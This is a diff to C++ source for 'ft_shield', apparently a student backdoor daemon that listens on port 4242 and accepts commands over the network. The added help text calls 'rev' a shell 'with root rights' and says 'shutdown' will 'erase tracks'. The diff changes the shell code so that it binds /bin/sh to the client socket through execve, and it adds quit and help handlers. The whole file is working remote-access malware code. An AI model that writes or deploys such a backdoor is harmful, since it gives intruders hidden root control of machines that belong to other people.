@@ -43,6 +43,8 @@ Ft_Shield::Ft_Shield(void) : _port(4242), _MaxClients(3), _run(true), _maxfd(2),
 	/* Map the commands into the command-mapper t_commands */
 	this->_cmdMap["shutdown\n"] = &Ft_Shield::_shutdown;
 	this->_cmdMap["rev\n"] = &Ft_Shield::_reverseShell;
+	this->_cmdMap["quit\n"] = &Ft_Shield::_disconnect;
+	this->_cmdMap["help\n"] = &Ft_Shield::_help;
 	return;
 }
 
@@ -107,7 +109,7 @@ void Ft_Shield::daemonize(void)
 			 * Open fails if the file already exists using this flags combination: O_CREAT | O_EXCL
 			 * Fail if another instance of ft_shield is running
 			 */
-			this->_checkInstance();
+			//this->_checkInstance();
 			this->_lockFile = open(DAEMON_LOCK_FILE, O_RDWR | O_CREAT | O_EXCL);
 			if (this->_run == true && this->_lockFile != -1)
 			{
@@ -228,7 +230,7 @@ void	Ft_Shield::_runSrv(void)
 					FD_SET(client, &master_set);
 					this->_maxfd = client > this->_maxfd ? client : this->_maxfd;
 					this->_nClients++;
-					send(client, "Connected to ft_shield\n", 24, 0);
+					send(client, "Connected to ft_shield:\n", 24, 0);
 				}
 				else if (client != -1)
 				{
@@ -243,7 +245,7 @@ void	Ft_Shield::_runSrv(void)
 				if (res <= 0)
 				{
 					close(fd);
-					this->_maxfd = (fd == this->_maxfd) ? this->_maxfd - 1 : this->_maxfd;
+					this->_maxfd = (fd == this->_maxfd) ? --this->_maxfd : this->_maxfd;
 					this->_nClients--;
 				}
 				else
@@ -265,8 +267,8 @@ void	Ft_Shield::_exit(void)
 	this->_run = false;
 	for (int fd = 3; fd <= this->_maxfd; fd++)
 		close(fd);
-	remove(DAEMON_LOCK_FILE);
-	remove(DAEMON_LOG_FILE);
+	//remove(DAEMON_LOCK_FILE);
+	//remove(DAEMON_LOG_FILE);
 
 	exit(EXIT_SUCCESS);
 }
@@ -279,8 +281,13 @@ void	Ft_Shield::_shutdown(int fd __attribute__((unused)))
 
 void	Ft_Shield::_reverseShell(int fd)
 {
-	int	pid = -1;
+	int		pid = -1;
+	char	*shell[2];
+	char	cmd[8] = "/bin/sh";
+	char	*arg = NULL;
 
+	shell[0] = cmd;
+	shell[1] = arg;
 	pid = fork();
 	if (pid != -1 && pid == 0)
 	{
@@ -291,12 +298,30 @@ void	Ft_Shield::_reverseShell(int fd)
 		dup2(fd, STDOUT_FILENO);
 		dup2(fd, STDERR_FILENO);
 		close(fd);
-		system("/bin/sh");
+		execve(shell[0], shell, NULL);
 		this->_exit();
 	}
 	else if (pid != -1 && pid > 0)
-	{
-		close(fd);
-	}
+		this->_disconnect(fd);
+	return;
+}
+
+void	Ft_Shield::_disconnect(int fd)
+{
+	close(fd);
+	this->_maxfd = (fd == this->_maxfd) ? --this->_maxfd : this->_maxfd;
+	this->_nClients--;
+	return;
+}
+
+void	Ft_Shield::_help(int fd)
+{
+	std::string	help;
+
+	help = "ft_shield list of commands:\n";
+	help += "\t- shutdown : terminate ft_shield and erase tracks\n";
+	help += "\t- rev      : open a shell with root rights\n";
+	help += "\t- quit     : disconnect you from ft_shield\n";
+	send(fd, help.c_str(), help.length(), 0);
 	return;
 }
